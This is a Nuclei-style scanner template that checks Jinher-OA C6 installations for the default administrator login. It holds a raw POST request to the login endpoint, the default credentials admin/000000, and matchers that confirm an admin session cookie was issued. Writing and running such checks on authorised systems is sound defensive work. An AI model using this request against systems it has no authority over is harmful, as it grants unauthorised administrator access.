id: jinher-oa-default-login

info:
  name: Jinher-OA C6 - Default Admin Discovery
  author: ritikchaddha
  severity: high
  description: Jinher-OA C6 default admin credentials were discovered.
  reference:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
  classification:
    cpe: cpe:2.3:a:jinher:jinher:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    vendor: jinher
    product: jinher
  tags: jinher,default-login,vuln

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=login&loginCode={{base64("{{username}}")}}&pwd={{base64("{{password}}")}}&

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - "000000"

    matchers-condition: and
    matchers:
      - type: word
        name: jinher
        cpe: cpe:2.3:a:jinher:jinher:*:*:*:*:*:*:*:*
        part: body
        words:
          - "ÏµÍ³¹ÜÀíÔ±|"
          - "ÄúºÃ|||"
        condition: and

      - type: word
        name: jinher-2
        cpe: cpe:2.3:a:jinher:jinher:*:*:*:*:*:*:*:*
        part: header
        words:
          - "SessionIDAdmin="

      - type: status
        status:
          - 200
